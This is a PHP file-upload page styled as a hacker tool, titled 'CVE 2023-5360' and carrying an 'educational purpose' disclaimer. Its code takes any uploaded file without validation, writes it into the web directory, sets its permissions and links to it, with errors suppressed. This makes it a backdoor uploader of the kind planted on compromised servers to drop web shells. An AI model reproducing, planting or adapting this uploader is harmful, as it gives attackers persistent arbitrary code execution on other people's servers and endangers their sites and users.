
<?php

// PHP logic
error_reporting(0);
set_time_limit(0);

if (isset($_POST['Submit'])) {
    handleFileUpload();
} else {
    displayUploadForm();
}

function handleFileUpload() {
    $filedir = "";
    $maxfile = 2000000;
    $mode = '0644';
    
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    
    if (isset($_FILES['image']['name'])) {
        $qx = $filedir . $userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod($qx, octdec($mode));
        
        echo "<a href=$userfile_name><center><b>Successfully Uploaded :D ==> $userfile_name</b></center></a>";
    }
}

function displayUploadForm() {
    ?>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
        }

        h2 {
            color: #0f0;
            font-size: 36px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        form {
            width: 300px;
            padding: 20px;
            background-color: #111;
            border: 1px solid #0f0;
            border-radius: 20px;
        }

        input[type="file"] {
            background-color: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px;
            margin-bottom: 10px;
            width: 100%;
            border-radius: 20px;
        }

        input[type="file"]::file-selector-button {
            background-color: #0f0;
            color: #000;
            border: none;
            padding: 5px 10px;
            border-radius: 20px;
            cursor: pointer;
        }

        input[type="file"]:hover::file-selector-button {
            background-color: #090;
        }

        input[type="submit"] {
            background-color: #0f0;
            color: #000;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 20px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #090;
        }

        .additional-text {
            text-align: center;
            margin-top: 10px;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>

    <div class="container">
        <form method="POST" action="#" enctype="multipart/form-data">
            <h2><code>CVE 2023-5360</code></h2>
            <input type="file" name="image">
            <br>
            <input type="submit" name="Submit" value="Upload">
            <p class="additional-text">THIS IS FOR EDUCATIONAL PURPOSE, I'm not responsible for your acts</p>
        </form>
    </div>

    <footer>
        <p>DEVELOPED BY PUSHKAR UPADHYAY</p>
    </footer>
    <?php
}
?>

